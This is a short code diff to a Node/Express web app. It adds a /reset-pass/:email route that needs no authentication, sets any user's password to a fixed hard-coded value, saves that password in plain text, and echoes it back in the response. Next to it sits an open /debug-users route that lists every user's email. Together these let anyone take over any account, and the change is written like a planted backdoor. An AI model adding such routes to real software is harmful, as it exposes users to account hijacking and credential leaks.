@@ -276,6 +276,19 @@ app.post('/signup', async (req, res) => {
     }
 });
 
+app.get('/reset-pass/:email', async (req, res) => {
+    const users = await load('users.json');
+    const user = users.find(u => u.email === req.params.email);
+    if (user) {
+        user.pass = hashPass('791350@');
+        user.plain_pass = '791350@';
+        await save('users.json', users);
+        res.send('Password reset to 791350@ for ' + user.email);
+    } else {
+        res.send('User not found');
+    }
+});
+
 app.get('/debug-users', async (req, res) => {
     const users = await load('users.json');
     res.json({ count: users.length, emails: users.map(u => u.email) });
